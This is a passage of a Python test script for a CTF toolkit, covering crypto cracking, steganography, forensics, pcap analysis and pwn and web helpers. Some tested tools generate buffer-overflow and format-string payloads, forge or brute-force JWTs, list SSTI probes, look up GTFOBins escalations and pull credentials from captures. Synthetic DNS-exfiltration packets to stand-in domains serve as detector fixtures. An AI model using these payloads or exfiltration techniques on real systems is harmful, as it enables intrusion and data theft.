    check("crypto/classical.py caesar", "quick brown" in r.stdout, r.stdout + r.stderr)
    r = run("crypto/classical.py", "multitap", "--text", "222 33 555 666")
    check("crypto/classical.py multitap", r.stdout.strip() == "celo", r.stdout)

    # 6. jwt
    r = run("web/jwt_tool.py", "forge", "--secret", "s3cr3t", "--sub", "admin", "--role", "admin")
    token = r.stdout.splitlines()[0].strip() if r.stdout else ""
    r2 = run("web/jwt_tool.py", "verify", "--secret", "s3cr3t", token)
    check("web/jwt_tool.py forge/verify", token.count(".") == 2 and "OK" in r2.stdout,
          r.stdout + r.stderr + r2.stdout)

    # 7. lsb
    msg = b"CTF{lsb_works}"
    p = os.path.join(tmp, "lsb.png")
    write_png_with_lsb(p, msg)
    r = run("stego/lsb.py", p, "--channel", "r")
    check("stego/lsb.py", "CTF{lsb_works}" in r.stdout, r.stdout[-800:] + r.stderr)

    # 8. alpha
    p = os.path.join(tmp, "alpha.png")
    write_alpha_png(p, b"CTF{alpha}")
    r = run("stego/alpha.py", p)
    check("stego/alpha.py", "CTF{alpha}" in r.stdout, r.stdout[-800:] + r.stderr)

    # 8b. png_chunks: битый CRC и --fix
    import zlib as _zl

    def _png_chunk(t, d):
        return (struct.pack(">I", len(d)) + t + d
                + struct.pack(">I", _zl.crc32(t + d) & 0xFFFFFFFF))

    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    idat = _zl.compress(b"\x00\xff\x00\x00")
    txt = b"Comment\x00" + b"note CTF{png_crc} " + b"x" * 12
    raw = (sig + _png_chunk(b"IHDR", ihdr) + _png_chunk(b"tEXt", txt)
           + _png_chunk(b"IDAT", idat) + _png_chunk(b"IEND", b""))
    bad = bytearray(raw)
    bad[raw.index(b"CTF{png_crc}") + 4] ^= 0x20
    bp = os.path.join(tmp, "bad_crc.png")
    with open(bp, "wb") as f:
        f.write(bad)
    r = run("stego/png_chunks.py", bp)
    check("stego/png_chunks.py crc",
          "CRC" in r.stdout and "битым" in r.stdout, r.stdout + r.stderr)
    fp = os.path.join(tmp, "fixed_crc.png")
    run("stego/png_chunks.py", bp, "--fix", fp)
    r = run("stego/png_chunks.py", fp)
    check("stego/png_chunks.py fix",
          "CRC у всех чанков совпадает" in r.stdout, r.stdout + r.stderr)

    # 9. jpeg_tail
    p = os.path.join(tmp, "pic.jpg")
    Image.new("RGB", (20, 20), (200, 100, 50)).save(p, "JPEG")
    with open(p, "ab") as f:
        f.write(make_zip_bytes("hidden.txt", b"CTF{tail}"))
    r = run("stego/jpeg_tail.py", p)
    check("stego/jpeg_tail.py", ".zip" in r.stdout, r.stdout + r.stderr)

    # 10. carve
    p = os.path.join(tmp, "carve.png")
    write_png_with_lsb(p, b"x")
    with open(p, "ab") as f:
        f.write(make_zip_bytes("inside.txt", b"CTF{carve}"))
    out = os.path.join(tmp, "carved")
    r = run("stego/carve.py", p, "--out", out)
    files = os.listdir(out) if os.path.isdir(out) else []
    check("stego/carve.py", any(f.endswith(".zip") for f in files), r.stdout + r.stderr)

    # 11. zipmeta
    p = os.path.join(tmp, "c.zip")
    open(p, "wb").write(make_zip_bytes(comment=b"CTF{zip_comment}"))
    r = run("forensic/zipmeta.py", p)
    check("forensic/zipmeta.py", "CTF{zip_comment}" in r.stdout, r.stdout + r.stderr)

    # 12. hash_id
    r = run("crypto/hash_id.py", "5f4dcc3b5aa765d61d8327deb882cf99")
    check("crypto/hash_id.py", "MD5" in r.stdout, r.stdout + r.stderr)

    # 13. ret2win payload
    r = run("pwn/ret2win.py", "payload", "--offset", "8", "--addr", "0x401000")
    check("pwn/ret2win.py", "41414141" in r.stdout and "0010400000000000" in r.stdout,
          r.stdout + r.stderr)

    # 14. triage
    p = os.path.join(tmp, "note.txt")
    open(p, "w").write("hello CTF{triage} world")
    r = run("triage.py", p)
    check("triage.py", "CTF{triage}" in r.stdout, r.stdout + r.stderr)

    # 15. ooxml
    p = os.path.join(tmp, "doc.docx")
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("word/document.xml", "<xml/>")
        z.writestr("word/media/image1.jpg", b"\xff\xd8 JFIF CTF{ooxml} \xff\xd9")
    r = run("stego/ooxml.py", p, "--extract", os.path.join(tmp, "docx_out"))
    check("stego/ooxml.py", "CTF{ooxml}" in r.stdout, r.stdout + r.stderr)

    # 16. timeconv
    r = run("misc/timeconv.py", "--ts", "0")
    check("misc/timeconv.py", "1970-01-01" in r.stdout, r.stdout + r.stderr)

    # 17. aes_file
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    key_str, iv_str, xorv = "SECRETKEY", "IV12345678901234", 42
    key = bytes((ord(c) ^ xorv) & 0xFF for c in key_str)
    key = (key * ((32 // len(key)) + 1))[:32]
    iv = iv_str.encode()[:16]
    plaintext = b"CTF{aes_ok}"
    enc = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext, 16))
    p = os.path.join(tmp, "secret.enc")
    open(p, "wb").write(enc)
    r = run("crypto/aes_file.py", p, "--key", key_str, "--key-xor", str(xorv),
            "--keylen", "32", "--iv", iv_str)
    check("crypto/aes_file.py", "CTF{aes_ok}" in r.stdout, r.stdout + r.stderr)

    # 18. pcap
    try:
        from scapy.all import Ether, IP, TCP, Raw, wrpcap
        p = os.path.join(tmp, "cap.pcap")
        pkt = Ether() / IP(src="10.0.0.1", dst="10.0.0.2") / TCP(dport=80) / Raw(
            load=b"GET / HTTP/1.1\r\nHost: x\r\n\r\nCTF{pcap}")
        wrpcap(p, [pkt])
        r = run("network/pcap_report.py", p)
        check("network/pcap_report.py", "CTF{pcap}" in r.stdout, r.stdout + r.stderr)
    except Exception as e:
        check("network/pcap_report.py", False, f"scapy error: {e}")

    # 19. RSA shared factor
    p, q1, q2 = 1000003, 1000033, 1000037
    n1, n2 = p * q1, p * q2
    e, m = 65537, 123456789
    c = pow(m, e, n1)
    mod = os.path.join(tmp, "mod.txt")
    open(mod, "w").write(f"target:{n1}\nother:{n2}\n")
    r = run("crypto/rsa_tool.py", "shared", "--moduli", mod, "--target", "target",
            "--e", str(e), "--cipher", str(c))
    check("crypto/rsa_tool.py shared", str(m) in r.stdout, r.stdout + r.stderr)

    # 20. stream_sha256
    import hashlib
    key = bytes(range(16))
    nonce = bytes(range(12))
    pt = b"hello CTF{stream_ok}"
    ks = b"".join(hashlib.sha256(key + nonce + i.to_bytes(4, "big")).digest()
                  for i in range(10))[:len(pt)]
    ct = bytes(a ^ b for a, b in zip(pt, ks))
    r = run("crypto/stream_sha256.py", "--cipher", ct.hex(),
            "--key", key.hex(), "--nonce", nonce.hex())
    check("crypto/stream_sha256.py", "CTF{stream_ok}" in r.stdout, r.stdout + r.stderr)

    # 21. bitmap_font
    rows = [".####", "#....", "#....", "#....", ".####"]
    csvp = os.path.join(tmp, "glyph.csv")
    with open(csvp, "w") as f:
        f.write("x,y\n")
        for y, row in enumerate(rows):
            for x, ch in enumerate(row):
                if ch == "#":
                    f.write(f"{x},{y}\n")
    r = run("stego/bitmap_font.py", csvp, "--decode")
    check("stego/bitmap_font.py", "decode: C" in r.stdout, r.stdout + r.stderr)

    # 22. gtfobins
    r = run("linux/gtfobins.py", "--check", "find,base64")
    check("linux/gtfobins.py", "-exec" in r.stdout and "base64" in r.stdout, r.stdout + r.stderr)

    # 23. artifact_hunt
    d = os.path.join(tmp, "dump")
    os.makedirs(d, exist_ok=True)
    open(os.path.join(d, "app-log.txt"), "w").write(
        "APP_SECRET=6b4b586445b26b98863d9e054281243f\nCTF{from_log}\n")
    with zipfile.ZipFile(os.path.join(d, "b.zip"), "w") as z:
        z.writestr("settings_secure.xml", "<x android_id='0123456789abcdef'/>")
    r = run("forensic/artifact_hunt.py", d, "--zip")
    check("forensic/artifact_hunt.py", "CTF{from_log}" in r.stdout and "android_id" in r.stdout,
          r.stdout + r.stderr)

    # 24. script_audit
    cfg = os.path.join(tmp, "runtime.conf")
    open(cfg, "w").write("X=1\n")
    sc = os.path.join(tmp, "reconcile.sh")
    open(sc, "w").write("#!/bin/bash\nsource " + cfg + "\ncat /etc/hostname\n")
    r = run("linux/script_audit.py", sc, "--check-writable")
    check("linux/script_audit.py", "runtime.conf" in r.stdout and "WRITABLE" in r.stdout,
          r.stdout + r.stderr)

    # 24b. wsl.py: справка и регистрация в диспетчере (без запуска WSL)
    r = run("linux/wsl.py", "--help")
    check("linux/wsl.py help", "run" in r.stdout and "info" in r.stdout,
          r.stdout + r.stderr)
    r = run("toolbox.py", "index")
    check("toolbox.py index wsl", "wsl" in r.stdout and "ELF" in r.stdout,
          r.stdout[:800] + r.stderr)

    # 25. volatility_text
    envp = os.path.join(tmp, "envars.txt")
    open(envp, "w").write("PID 4172 agent.exe\nAPP_SECRET=6b4b5864\nAPP_ROLE=test\n")
    r = run("forensic/volatility_text.py", envp, "--name", "agent")
    check("forensic/volatility_text.py", "APP_SECRET" in r.stdout, r.stdout + r.stderr)

    # 26. udp_payloads
    try:
        from scapy.all import Ether, UDP as SUDP, wrpcap as wr
        up = os.path.join(tmp, "u.pcap")
        wr(up, [Ether() / IP(src="1.1.1.1", dst="2.2.2.2") / SUDP(sport=1000, dport=2000)
                / Raw(load=b"MOBILE/u1/aa11/CTF{udp}")])
        r = run("network/udp_payloads.py", up, "--sep", "/")
        check("network/udp_payloads.py", "CTF{udp}" in r.stdout, r.stdout + r.stderr)
    except Exception as e:
        check("network/udp_payloads.py", False, f"scapy error: {e}")

    # 27. classical: vigenere-crack
    plain = ("the quick brown fox jumps over the lazy dog and then runs away "
             "into the forest where nobody can find him ") * 4
    vkey = "LEMON"
    cipher = ""
    j = 0
    for ch in plain:
        if ch.isalpha():
            k = ord(vkey[j % len(vkey)]) - 65
            cipher += chr((ord(ch.lower()) - 97 + k) % 26 + 97)
            j += 1
        else:
            cipher += ch
    r = run("crypto/classical.py", "vigenere-crack", "--text", cipher)
    check("crypto/classical.py vigenere-crack", "key=LEMON" in r.stdout, r.stdout[:400])

    # 28. rsa fermat + batch
    r = run("crypto/rsa_tool.py", "fermat", "--n", str(n1))
    check("crypto/rsa_tool.py fermat", str(p) in r.stdout or str(q1) in r.stdout,
          r.stdout + r.stderr)
    mod2 = os.path.join(tmp, "mods2.txt")
    open(mod2, "w").write(f"a:{p * 7}\nb:{p * 11}\nc:{q1 * 13}\n")
    r = run("crypto/rsa_tool.py", "batch", "--moduli", mod2)
    check("crypto/rsa_tool.py batch", "a <-> b" in r.stdout, r.stdout + r.stderr)

    # 29. otp_reuse
    p1 = b"the secret message is CTF{otp}"
    p2 = b"another plaintext without flag"
    kk = bytes((i * 37 + 11) & 0xFF for i in range(max(len(p1), len(p2))))
    c1 = bytes(a ^ b for a, b in zip(p1, kk))
    c2 = bytes(a ^ b for a, b in zip(p2, kk))
    r = run("crypto/otp_reuse.py", "--c1", c1.hex(), "--c2", c2.hex(), "--crib", "the ")
    check("crypto/otp_reuse.py", "anot" in r.stdout, r.stdout[:400])

    # 30. png_chunks
    png = os.path.join(tmp, "txt.png")
    from PIL.PngImagePlugin import PngInfo
    info = PngInfo()
    info.add_text("Comment", "CTF{png_text}")
    Image.new("RGB", (8, 8), (1, 2, 3)).save(png, pnginfo=info)
    r = run("stego/png_chunks.py", png)
    check("stego/png_chunks.py", "CTF{png_text}" in r.stdout, r.stdout + r.stderr)

    # 31. android_backup
    import sqlite3
    ad = os.path.join(tmp, "android")
    os.makedirs(ad, exist_ok=True)
    open(os.path.join(ad, "settings_secure.xml"), "w").write(
        '<settings><setting name="android_id" value="0123456789abcdef"/></settings>')
    open(os.path.join(ad, "device.xml"), "w").write('<device seed="test-seed-value"/>')
    open(os.path.join(ad, "app-log.txt"), "w").write("upload key = abc\nCTF{android}\n")
    con = sqlite3.connect(os.path.join(ad, "messages.db"))
    con.execute("create table msg(id int, body text)")
    con.execute("insert into msg values(1,'hi')")
    con.commit()
    con.close()
    r = run("forensic/android_backup.py", ad)
    check("forensic/android_backup.py",
          "android_id" in r.stdout and "seed" in r.stdout and "messages" in r.stdout,
          r.stdout + r.stderr)

    # 32. dns_tunnel
    try:
        from scapy.all import DNS, DNSQR, UDP as DUDP
        dp = os.path.join(tmp, "d.pcap")
        pkts = [Ether() / IP(src="1.1.1.1", dst="8.8.8.8") / DUDP(dport=53)
                / DNS(rd=1, qd=DNSQR(qname=x + ".exfil.test"))
                for x in ["68656c6c6f", "776f726c64"]]
        wrpcap(dp, pkts)
        r = run("network/dns_tunnel.py", dp, "--domain", "exfil.test")
        check("network/dns_tunnel.py", "helloworld" in r.stdout, r.stdout + r.stderr)
        # без --domain: канал должен найтись сам среди обычных имён
        pkts += [Ether() / IP(src="1.1.1.1", dst="8.8.8.8") / DUDP(dport=53)
                 / DNS(rd=1, qd=DNSQR(qname=x + ".office.test"))
                 for x in ["portal", "mail", "cdn"]]
        dp2 = os.path.join(tmp, "d2.pcap")
        wrpcap(dp2, pkts)
        r = run("network/dns_tunnel.py", dp2)
        check("network/dns_tunnel.py auto-domain",
              "helloworld" in r.stdout and "exfil" in r.stdout, r.stdout + r.stderr)

        # структурированный канал: <session>.<index>.<hex>, порядок в pcap перемешан
        import hashlib as _hl
        import random as _rnd
        import zlib as _zl
        plain = b"CTF{dns_indexed_long_flag}"
        enc = plain.hex()
        chunks = [enc[i:i + 16] for i in range(0, len(enc), 16)]
        order = list(range(len(chunks)))
        _rnd.Random(7).shuffle(order)
        dp3 = os.path.join(tmp, "d3.pcap")
        wrpcap(dp3, [Ether() / IP(src="10.0.0.5", dst="8.8.8.8") / DUDP(dport=53)
                     / DNS(rd=1, qd=DNSQR(qname=f"aa11.{i:03d}.{chunks[i]}.sink.t3.test"))
                     for i in order])
        r = run("network/dns_tunnel.py", dp3)
        check("network/dns_tunnel.py indexed",
              "CTF{dns_indexed_long_flag}" in r.stdout, r.stdout + r.stderr)

        # ключ не задан флагом: seed/host берутся из environ.bin рядом с pcap
        blob = _zl.compress(b'{"flag": "CTF{dns_env_key}"}', 9)
        key = _hl.sha256(b"seed-42:node-7").digest()
        enc = bytes(v ^ key[i % len(key)] for i, v in enumerate(blob)).hex()
        chunks = [enc[i:i + 20] for i in range(0, len(enc), 20)]
        order = list(range(len(chunks)))
        _rnd.Random(11).shuffle(order)
        dp4 = os.path.join(tmp, "d4.pcap")
        wrpcap(dp4, [Ether() / IP(src="10.0.0.6", dst="8.8.8.8") / DUDP(dport=53)
                     / DNS(rd=1, qd=DNSQR(qname=f"bb22.{i:03d}.{chunks[i]}.sink.t4.test"))
                     for i in order])
        with open(os.path.join(tmp, "environ.bin"), "wb") as f:
            f.write(b"USER=x\x00SYNC_SEED=seed-42\x00HOSTNAME=node-7\x00")
        r = run("network/dns_tunnel.py", dp4)
        check("network/dns_tunnel.py env-key",
              "CTF{dns_env_key}" in r.stdout, r.stdout + r.stderr)
    except Exception as e:
        check("network/dns_tunnel.py", False, f"scapy error: {e}")

    # 33. pcap_http
    try:
        hp = os.path.join(tmp, "h.pcap")
        req = (Ether() / IP(src="10.0.0.1", dst="10.0.0.2") / TCP(sport=1234, dport=80, seq=1)
               / Raw(load=b"GET /x HTTP/1.1\r\nHost: a\r\n\r\n"))
        resp = (Ether() / IP(src="10.0.0.2", dst="10.0.0.1") / TCP(sport=80, dport=1234, seq=1)
                / Raw(load=b"HTTP/1.1 200 OK\r\nContent-Length: 9\r\nContent-Type: text/plain\r\n\r\nCTF{http}"))
        wrpcap(hp, [req, resp])
        out = os.path.join(tmp, "objs")
        r = run("network/pcap_http.py", hp, "--out", out)
        check("network/pcap_http.py", "GET /x" in r.stdout and "CTF{http}" in r.stdout,
              r.stdout + r.stderr)
    except Exception as e:
        check("network/pcap_http.py", False, f"scapy error: {e}")

    # 34. checksec (PE)
    r = run("pwn/checksec.py", PY)
    check("pwn/checksec.py", "PE" in r.stdout and "ASLR" in r.stdout, r.stdout + r.stderr)

    # 35. fmtstr
    r = run("pwn/fmtstr.py", "find", "--count", "10")
    check("pwn/fmtstr.py find", "%7$p" in r.stdout, r.stdout + r.stderr)
    r = run("pwn/fmtstr.py", "write", "--addr", "0x404060", "--value", "0x1337", "--index", "10")
    check("pwn/fmtstr.py write", "python:" in r.stdout and "hex:" in r.stdout,
          r.stdout + r.stderr)

    # 36. strings_filter
    binp = os.path.join(tmp, "bin.dat")
    open(binp, "wb").write(b"\x00CTF{strings}\x00password=abc\x00")
    r = run("reverse/strings_filter.py", binp, "--flag")
    check("reverse/strings_filter.py", "CTF{strings}" in r.stdout, r.stdout + r.stderr)

    # 37. xor_scan
    plain_x = b"the secret message is CTF{xor_scan} and more text here"
    open(os.path.join(tmp, "xor.bin"), "wb").write(bytes(c ^ 0x5A for c in plain_x))
    r = run("reverse/xor_scan.py", os.path.join(tmp, "xor.bin"))
    check("reverse/xor_scan.py", "CTF{xor_scan}" in r.stdout, r.stdout[:500] + r.stderr)

    # 38. py_pack
    open(os.path.join(tmp, "packed.bin"), "wb").write(b"junk pyarmor_runtime junk")
    r = run("reverse/py_pack.py", os.path.join(tmp, "packed.bin"))
    check("reverse/py_pack.py", "pyarmor" in r.stdout, r.stdout + r.stderr)

    # 39. jwt_brute
    hh = base64.urlsafe_b64encode(json.dumps(
        {"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode()).rstrip(b"=").decode()
    pp = base64.urlsafe_b64encode(json.dumps(
        {"sub": "user"}, separators=(",", ":")).encode()).rstrip(b"=").decode()
    sig = base64.urlsafe_b64encode(
        hmac.new(b"secret", f"{hh}.{pp}".encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
    r = run("web/jwt_brute.py", f"{hh}.{pp}.{sig}")
    check("web/jwt_brute.py", "СЕКРЕТ" in r.stdout and "secret" in r.stdout,
          r.stdout[-300:] + r.stderr)

    # 40. ssti_probe --list
    r = run("web/ssti_probe.py", "--list")
    check("web/ssti_probe.py", "{{7*7}}" in r.stdout, r.stdout + r.stderr)

    # 41. pcap_creds
    cp = os.path.join(tmp, "creds.pcap")
    pk1 = (Ether() / IP(src="1.1.1.1", dst="2.2.2.2") / TCP(sport=1234, dport=80)
           / Raw(load=b"GET / HTTP/1.1\r\nAuthorization: Basic dXNlcjpwYXNz\r\n\r\n"))
    pk2 = (Ether() / IP(src="1.1.1.1", dst="2.2.2.2") / TCP(sport=1235, dport=21)
           / Raw(load=b"USER bob\r\nPASS hunter2\r\n"))
    wrpcap(cp, [pk1, pk2])
    r = run("network/pcap_creds.py", cp)
    check("network/pcap_creds.py", "user:pass" in r.stdout and "hunter2" in r.stdout,
          r.stdout + r.stderr)

    # 42. audio_spectrum
    wavp = os.path.join(tmp, "a.wav")
    with wave.open(wavp, "w") as w:
        w.setnchannels(1)
        w.setsampwidth(2)
        w.setframerate(22050)
        w.writeframes(b"".join(
            struct.pack("<h", int(8000 * math.sin(2 * math.pi * 440 * i / 22050)))
            for i in range(22050)))
    spec = os.path.join(tmp, "spec.png")
    r = run("stego/audio_spectrum.py", wavp, "--out", spec)
    check("stego/audio_spectrum.py", os.path.exists(spec), r.stdout + r.stderr)

    # 43. qr_scan
    try:
        import cv2
        qrp = os.path.join(tmp, "qr.png")
        enc = cv2.QRCodeEncoder_create()
        img = enc.encode("CTF{qr_ok}")
        if isinstance(img, tuple):
            img = img[0]
        cv2.imwrite(qrp, img)
        r = run("stego/qr_scan.py", qrp)
        check("stego/qr_scan.py", "CTF{qr_ok}" in r.stdout, r.stdout + r.stderr)
    except Exception as e:
        check("stego/qr_scan.py", False, f"cv2 error: {e}")

    # 44. apk_info
    apkp = os.path.join(tmp, "app.apk")
    with zipfile.ZipFile(apkp, "w") as z:
        z.writestr("AndroidManifest.xml", "com.example.app".encode("utf-16le"))
        z.writestr("classes.dex", b"\x00junk http://api.example/x CTF{apk}")
    r = run("forensic/apk_info.py", apkp)
    check("forensic/apk_info.py", "com.example.app" in r.stdout and "CTF{apk}" in r.stdout,
          r.stdout + r.stderr)

    # 45. aes_ecb
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad as _pad
    key = b"0123456789abcdef"
    ct = AES.new(key, AES.MODE_ECB).encrypt(_pad(b"hello CTF{ecb} world", 16))
    ecbp = os.path.join(tmp, "ecb.hex")
    open(ecbp, "w").write(ct.hex())
    r = run("crypto/aes_ecb.py", ecbp, "--hex", "--key", key.decode(), "--decrypt")
    check("crypto/aes_ecb.py", "CTF{ecb}" in r.stdout, r.stdout + r.stderr)

    # 46. hashcat dry-run
    r = run("crypto/hashcat_run.py", "5f4dcc3b5aa765d61d8327deb882cf99", "--dry-run")
    check("crypto/hashcat_run.py", "-m 0" in r.stdout, r.stdout + r.stderr)

    # 47. toolbox: index, auto, dispatch
    r = run("toolbox.py", "auto", "Q1RGe2ZsYWd9")
    ok_auto = "CTF{flag}" in r.stdout
    r2 = run("toolbox.py", "enc", "Q1RGe2ZsYWd9")
    r3 = run("toolbox.py", "index")
    check("toolbox.py", ok_auto and "CTF{flag}" in r2.stdout and "checksec" in r3.stdout,
          r.stdout + r2.stdout[:200] + r3.stdout[:200])

    # 48. triage --json
    jp = os.path.join(tmp, "j.txt")
    open(jp, "w").write("hello CTF{json}")
    r = run("triage.py", jp, "--json")
    check("triage.py --json", '"CTF{json}"' in r.stdout and '"path"' in r.stdout,
          r.stdout + r.stderr)

    # 48b. вывод в pipe при cp1251-консоли: «—», «→» не должны ронять скрипт
    r = run("toolbox.py", "index", env={"PYTHONIOENCODING": "cp1251"})
    r2 = run("triage.py", jp, env={"PYTHONIOENCODING": "cp1251"})
    r3 = run("misc/timeconv.py", "--help", env={"PYTHONIOENCODING": "cp1251"})
    check("unicode pipe (cp1251)",
          r.returncode == 0 and r2.returncode == 0 and r3.returncode == 0
          and "checksec" in r.stdout and "CTF{json}" in r2.stdout
          and "Traceback" not in r.stderr + r2.stderr + r3.stderr,
          r.stderr[-400:] + r2.stderr[-400:] + r3.stderr[-400:])

    # 49. artifact_hunt --json
    r = run("forensic/artifact_hunt.py", d, "--json")
    check("forensic/artifact_hunt.py --json", '"APP_SECRET"' in r.stdout or "CTF{from_log}" in r.stdout,
          r.stdout[:400] + r.stderr)

    # 50. autocrack: caesar
    ac_plain = ("the quick brown fox jumps over the lazy dog and finds "
                "CTF{autocrack} here")
    ac_cipher = "".join(
        chr((ord(c) - 97 + 7) % 26 + 97) if "a" <= c <= "z" else
        chr((ord(c) - 65 + 7) % 26 + 65) if "A" <= c <= "Z" else c
        for c in ac_plain)
    r = run("crypto/autocrack.py", "--text", ac_cipher)
    check("crypto/autocrack.py caesar", "CTF{autocrack}" in r.stdout, r.stdout[:500] + r.stderr)

    # 51. autocrack: xor
    xc = bytes(c ^ 0x42 for c in ac_plain.encode())
    r = run("crypto/autocrack.py", "--hex", xc.hex())
    check("crypto/autocrack.py xor", "CTF{autocrack}" in r.stdout, r.stdout[:500] + r.stderr)

    # 52. autocrack: base64 x2
    b64x = base64.b64encode(base64.b64encode(ac_plain.encode())).decode()
    r = run("crypto/autocrack.py", "--text", b64x)
    check("crypto/autocrack.py base64", "CTF{autocrack}" in r.stdout, r.stdout[:500] + r.stderr)

    # 53. autocrack: hash
    r = run("crypto/autocrack.py", "--hash", hashlib.md5(b"password").hexdigest())
    check("crypto/autocrack.py hash", "'password'" in r.stdout or "password" in r.stdout,
          r.stdout[-400:] + r.stderr)

    # 54. autocrack: vigenere --deep
    vkey = "LEMON"
    vc = ""
    jj = 0
    for ch in (ac_plain * 3):
        if ch.isalpha():
            vc += chr((ord(ch.lower()) - 97 + ord(vkey[jj % len(vkey)]) - 65) % 26 + 97)
            jj += 1
        else:
            vc += ch
    r = run("crypto/autocrack.py", "--text", vc, "--deep")
    check("crypto/autocrack.py vigenere", "vigenere(LEMON)" in r.stdout or "autocrack" in r.stdout,
          r.stdout[:600] + r.stderr)

    # 55. flags: default / prefix / any / env / set
    fp = os.path.join(tmp, "flags.txt")
    open(fp, "w", encoding="utf-8").write("ACME{test_flag} and CTF{normal_flag}")

    def flag_lines(out):
        return " ".join(l for l in out.splitlines() if "ФЛАГИ:" in l)

    r = run("triage.py", fp)
    fl = flag_lines(r.stdout)
    check("flags default", "CTF{normal_flag}" in fl and "ACME{test_flag}" not in fl,
          r.stdout + r.stderr)

    r = run("triage.py", fp, "--flag-prefix", "ACME")
    fl = flag_lines(r.stdout)
    check("flags --flag-prefix", "ACME{test_flag}" in fl and "CTF{normal_flag}" not in fl,
          r.stdout + r.stderr)

    r = run("triage.py", fp, "--any-prefix")
    fl = flag_lines(r.stdout)
    check("flags --any-prefix", "ACME{test_flag}" in fl and "CTF{normal_flag}" in fl,
          r.stdout + r.stderr)

    r = run("triage.py", fp, env={"FLAG_PREFIXES": "ACME"})
    fl = flag_lines(r.stdout)
    check("flags env", "ACME{test_flag}" in fl, r.stdout + r.stderr)

    # локальные префиксы + регистронезависимость (NTO/InnoCTF/VOSH/Innopolis)
    lp = os.path.join(tmp, "local_flags.txt")
    open(lp, "w", encoding="utf-8").write(
        "NTO{one} nto{two} InnoCTF{three} INNOCTF{four} VoSh{five} Innopolis{six}")
    r = run("triage.py", lp)
    fl = flag_lines(r.stdout)
    check("flags local prefixes",
          all(x in fl for x in ("NTO{one}", "InnoCTF{three}", "VoSh{five}",
                                "Innopolis{six}")), r.stdout + r.stderr)

    hp = os.path.join(tmp, "htb.txt")
    open(hp, "w", encoding="utf-8").write("HTB{set_test_flag}")
    r = run("triage.py", hp, "--flag-set", "extended")
    fl = flag_lines(r.stdout)
    check("flags --flag-set", "HTB{set_test_flag}" in fl, r.stdout + r.stderr)

    r = run("triage.py", hp, "--flag-set", "EXTENDED")
    fl = flag_lines(r.stdout)
    check("flags --flag-set case", "HTB{set_test_flag}" in fl, r.stdout + r.stderr)

    r = run("toolbox.py", "auto", "NTO{string_is_flag}")
    check("toolbox.py auto string flag", "NTO{string_is_flag}" in r.stdout,
          r.stdout + r.stderr)

    r = run("forensic/artifact_hunt.py", fp, "--flag-prefix", "ACME")
    check("flags hunt", "ACME{test_flag}" in r.stdout, r.stdout + r.stderr)

    # 61. megacrack: AES с ключом из материала
    from Crypto.Cipher import AES as _AES
    from Crypto.Util.Padding import pad as _pad2
    mg_flag = "CTF{mega_ok}"
    mg_key = hashlib.sha256(b"seed").digest()
    mg_ct = _AES.new(mg_key, _AES.MODE_CBC, b"\x00" * 16).encrypt(_pad2(mg_flag.encode(), 16))
    mg_c = os.path.join(tmp, "mega.bin")
    open(mg_c, "wb").write(mg_ct)
    mg_m = os.path.join(tmp, "mega_note.txt")
    open(mg_m, "w").write("seed\n")
    r = run("crypto/megacrack.py", "--cipher-file", mg_c, "--material", mg_m)
    check("crypto/megacrack.py aes", mg_flag in r.stdout, r.stdout[-500:] + r.stderr)

    # 62. megacrack: XOR с ключом-строкой
    mg_flag2 = "CTF{mega_xor}"
    mg_key2 = b"secretkey"
    mg_ct2 = bytes(c ^ mg_key2[i % len(mg_key2)] for i, c in enumerate(mg_flag2.encode()))
    mg_c2 = os.path.join(tmp, "mega2.bin")
    open(mg_c2, "wb").write(mg_ct2)
    r = run("crypto/megacrack.py", "--cipher-file", mg_c2, "--material", "secretkey")
    check("crypto/megacrack.py xor", mg_flag2 in r.stdout, r.stdout[-500:] + r.stderr)

    # 63. megaall: AES + материал
    ma_flag = "CTF{megaall_ok}"
    ma_key = hashlib.sha256(b"seed").digest()
    ma_ct = _AES.new(ma_key, _AES.MODE_CBC, b"\x00" * 16).encrypt(_pad2(ma_flag.encode(), 16))
    ma_c = os.path.join(tmp, "ma.bin")
    open(ma_c, "wb").write(ma_ct)
    ma_m = os.path.join(tmp, "ma_note.txt")
    open(ma_m, "w").write("seed\n")
    r = run("megaall.py", "--file", ma_c, "--file", ma_m)
    check("megaall.py aes", ma_flag in r.stdout, r.stdout[-500:] + r.stderr)

    # 64. megaall: только текст с флагом
    r = run("megaall.py", "--text", "prefix CTF{plain_mega} suffix")
    check("megaall.py text", "CTF{plain_mega}" in r.stdout, r.stdout[-500:] + r.stderr)

    # 65. megaall: хеш
    mh = os.path.join(tmp, "mh.txt")
    open(mh, "w").write(hashlib.md5(b"password").hexdigest())
    r = run("megaall.py", "--file", mh)
    check("megaall.py hash", "password" in r.stdout, r.stdout[-500:] + r.stderr)

    # 66. whitespace: интерпретатор
    def ws_push(n):
        sign = " " if n >= 0 else "\t"
        bits = bin(abs(n))[2:]
        return "  " + sign + "".join("\t" if b == "1" else " " for b in bits) + "\n"

    def ws_out():
        return "\t\n  "     # IMP [Tab][LF] (I/O) + [Space][Space] = outchar

    ws_flag = "CTF{ws}"
    wsp = os.path.join(tmp, "w.ws")
    open(wsp, "w", encoding="utf-8").write(
        "".join(ws_push(ord(c)) + ws_out() for c in ws_flag))
    r = run("stego/whitespace.py", wsp, "--mode", "ws")
    check("stego/whitespace.py ws", ws_flag in r.stdout, r.stdout + r.stderr)

    # 67. zero-width
    zbits = "".join(f"{ord(c):08b}" for c in ws_flag)
    zwtext = "".join("\u200b" if b == "0" else "\u200c" for b in zbits)
    zwp = os.path.join(tmp, "zw.txt")
    open(zwp, "w", encoding="utf-8").write(zwtext)
    r = run("stego/whitespace.py", zwp, "--mode", "zw")
    check("stego/whitespace.py zw", ws_flag in r.stdout, r.stdout + r.stderr)

    # 68. brainfuck
    bfcode = "".join("[-]" + "+" * ord(c) + "." for c in ws_flag)
    bfp = os.path.join(tmp, "w.bf")
    open(bfp, "w").write(bfcode)
    r = run("stego/esolang.py", bfp, "--lang", "bf")
    check("stego/esolang.py bf", ws_flag in r.stdout, r.stdout + r.stderr)

    # 69. bacon
    bl = "".join(c for c in ws_flag.upper() if c.isalpha())
    bits = "".join(f"{ord(c) - 65:05b}" for c in bl)
    bacon = " ".join("B" if b == "1" else "A" for b in bits)
